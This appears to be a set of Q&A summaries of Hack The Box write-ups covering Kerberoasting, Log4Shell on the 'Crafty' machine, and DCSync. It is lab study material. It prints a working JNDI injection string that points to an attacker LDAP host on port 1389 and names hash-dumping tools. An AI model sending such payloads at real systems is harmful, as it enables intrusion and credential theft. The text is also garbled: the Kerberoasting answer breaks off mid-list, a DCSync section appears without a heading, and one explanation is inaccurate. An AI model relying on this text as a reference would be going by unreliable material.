## Q6 — Kerberoasting in Active Directory

**Question:** How does Kerberoasting work in Active Directory environments and which HTB machines demonstrate it?

**Answer:**

**Kerberoasting in Active Directory**

- **What it does**  
  - An authenticated user requests a Ticket‑Granting Service (TGS) for a service account that has a Service Principal Name (SPN) configured.  
  - The Domain Controller (DC) issues the TGS, encrypting it with the service account’s password hash.  
  - The attacker captures the TGS (the “Kerberoast”), then performs an offline brute‑force or dictionary attack against the hash to recover the service account password.  
  - Because the password is stored in the ticket, no additional credentials are needed beyond the ability to request the TGS.  

  (seen on: htb-active, htb-rebound, htb-sizzle, htb-tombwatcher)

- **Key steps in the writeups**

## Q8 — CVE-2021-44228 Log4Shell RCE

**Question:** What is CVE-2021-44228 (Log4Shell) and how was it exploited across HTB machines?

**Answer:**

**CVE‑2021‑44228 (Log4Shell)**  
- A remote code‑execution flaw in Apache Log4j 2 that allows an attacker to inject a JNDI lookup string (e.g., `${jndi:ldap://…}`) into a log entry.  
- When the vulnerable Log4j instance processes the string, it contacts the supplied LDAP server, retrieves a malicious Java class, and executes it, giving the attacker arbitrary code execution on the target machine.  

**How it was exploited on HTB machines (example: *Crafty*)**  
- The attacker ran a Python PoC (`poc.py`) that:
  1. Generated a malicious Java class and started an LDAP server on port 1389.  
  2. Served a JNDI payload (`${jndi:ldap://10.10.14.6:1389/a}`) to the target.  
  3. Sent this payload to the vulnerable service (Minecraft) running on the machine.  
  4. The Minecraft server logged the payload, triggered the JNDI lookup, and the LDAP server returned the malicious class, resulting in a shell on the target.  

*(seen on: htb‑crafty)*

**How DCSync works (as shown in the write‑ups)**

- The attacker authenticates as a domain controller (or a user with the *Replicating Directory Changes* privilege).  
- Using the Kerberos TGT or explicit credentials, the attacker sends an LDAP/SMB/RPC request that mimics a DC replication request.  
- The target DC returns the password hash data for all domain accounts (or the requested account).  
- The attacker captures the hashes (e.g., with `secretsdump.py` or `netexec`) and can then use them for offline cracking or pass‑the‑hash attacks.
